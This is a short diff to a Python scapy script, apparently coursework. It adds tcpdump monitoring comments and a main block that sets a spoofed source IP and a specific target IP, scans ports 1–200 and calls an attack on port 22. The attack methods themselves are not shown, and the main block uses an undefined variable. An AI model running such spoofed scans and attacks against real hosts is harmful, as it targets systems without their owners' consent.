@@ -9,7 +9,7 @@ import sys, socket
 import re
 import os.path
 
-from scapy.all import *
+from scapy.all import * #use to create and send network packets
 
 class TcpAttack:
 
@@ -54,5 +54,17 @@ class TcpAttack:
         else:
             return 0                                                           
 
+#10.0.0.8 is machine i am attacking
+#ON ATTACKER MACHINE (MINE): sudo tcpdump -vvv -nn -i wlan0 -s 1500 -S -X ’dst 10.0.0.8’
+
+#10.0.0.19 is spoofed address of attacker
+#ON THE ATTACKED MACHINE: sudo tcpdump -vvv -nn -i wlan0 -s 1500 -S -X ’src 10.0.0.19’
 if __name__ == '__main__':
-    j
+    spoofIP = '123.12.1.12'
+    targetIP = '128.46.4.84'
+    rangeStart = 1
+    rangeEnd = 200
+    Tcp = TcpAttack(spoofIP, targetIP)
+    Tcp.scanTarget(rangeStart, rangeEnd)
+    if Tcp.attackTarget(port, 22):
+        print('port was open to attack')
